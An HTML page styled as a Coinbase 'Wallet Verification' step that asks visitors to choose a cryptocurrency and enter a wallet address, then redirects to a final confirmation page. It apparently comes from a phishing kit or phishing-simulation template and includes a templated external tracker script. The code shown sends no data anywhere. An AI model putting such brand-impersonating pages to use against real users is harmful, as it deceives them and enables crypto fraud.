<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Verification - Coinbase</title>
    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
    <link rel="stylesheet" href="styles.css">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="logo-container">
            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="signup-container">
            <!-- Wallet Icon -->
            <div class="form-icon">
                <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
                    <circle cx="32" cy="32" r="32" fill="#5b8df5" opacity="0.15"/>
                    <path d="M16 24h32v-4a2 2 0 00-2-2H18a2 2 0 00-2 2v20a2 2 0 002 2h28a2 2 0 002-2v-4H34a4 4 0 01-4-4v-4a4 4 0 014-4h14" stroke="#5b8df5" stroke-width="2" fill="none"/>
                    <circle cx="40" cy="30" r="2" fill="#5b8df5"/>
                </svg>
            </div>
            
            <h1 class="title">Confirm your wallet address</h1>
            <p class="subtitle">Please verify your cryptocurrency wallet address for withdrawals.</p>

            <!-- Wallet Verification Form -->
            <form id="walletForm" class="signup-form">
                <select 
                    id="cryptoType" 
                    name="cryptoType" 
                    class="email-input"
                    required
                >
                    <option value="">Select cryptocurrency</option>
                    <option value="BTC">Bitcoin (BTC)</option>
                    <option value="ETH">Ethereum (ETH)</option>
                    <option value="USDT">Tether (USDT)</option>
                    <option value="USDC">USD Coin (USDC)</option>
                    <option value="LTC">Litecoin (LTC)</option>
                </select>
                
                <input 
                    type="text" 
                    id="walletAddress" 
                    name="walletAddress" 
                    class="email-input" 
                    placeholder="Enter wallet address"
                    autocomplete="off"
                    required
                >
                
                <input 
                    type="text" 
                    id="walletLabel" 
                    name="walletLabel" 
                    class="email-input" 
                    placeholder="Wallet label (optional)"
                    autocomplete="off"
                >
                
                <button type="submit" class="continue-btn">Verify Wallet</button>
            </form>

            <!-- Warning Note -->
            <div class="warning-note">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="display: inline-block; vertical-align: middle; margin-right: 8px;">
                    <circle cx="8" cy="8" r="7" stroke="#ffa726" stroke-width="1.5" fill="none"/>
                    <path d="M8 4v5m0 2v1" stroke="#ffa726" stroke-width="1.5" stroke-linecap="round"/>
                </svg>
                <span style="color: #ffa726; font-size: 13px;">Double-check your address. Crypto transactions cannot be reversed.</span>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <p class="footer-text">
            Only send cryptocurrency to addresses that match the selected network.
        </p>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const walletForm = document.getElementById('walletForm');
            const cryptoTypeSelect = document.getElementById('cryptoType');
            const walletAddressInput = document.getElementById('walletAddress');
            const submitBtn = walletForm.querySelector('.continue-btn');
            
            // Check if required fields are filled
            function checkFormValidity() {
                const cryptoSelected = cryptoTypeSelect.value !== '';
                const addressFilled = walletAddressInput.value.trim() !== '';
                
                if (cryptoSelected && addressFilled) {
                    submitBtn.classList.add('active');
                } else {
                    submitBtn.classList.remove('active');
                }
            }
            
            cryptoTypeSelect.addEventListener('change', checkFormValidity);
            walletAddressInput.addEventListener('input', checkFormValidity);
            
            checkFormValidity();
            
            walletForm.addEventListener('submit', function(e) {
                e.preventDefault();
                window.location.href = 'final-confirmation.html';
            });
        });
    </script>
</body>
</html>
